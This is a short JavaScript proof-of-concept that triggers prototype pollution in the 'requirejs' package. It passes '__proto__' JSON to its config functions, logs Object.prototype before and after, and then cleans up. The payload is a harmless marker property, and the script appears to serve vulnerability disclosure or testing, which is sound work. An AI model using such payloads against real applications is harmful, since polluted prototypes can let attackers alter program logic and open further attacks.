(async () => {
  const requirejs = await import('requirejs'); // Import the vulnerable package

  // Victim object
  const victim = {};
  console.log("Before Attack: ", JSON.stringify(victim.__proto__));

  try {
    // Triggering the Prototype Pollution vulnerability
    requirejs.config(JSON.parse('{"__proto__":{"pollutedProp":123}}'));
    requirejs.s.contexts._.configure(JSON.parse('{"__proto__":{"pollutedProp":123}}'));
  } catch (error) {
    console.error("Error during attack:", error.message);
  }

  // Checking if the prototype has been polluted
  console.log("After Attack: ", JSON.stringify(victim.__proto__));

  // Cleaning up the polluted property
  delete Object.prototype.pollutedProp;
})();
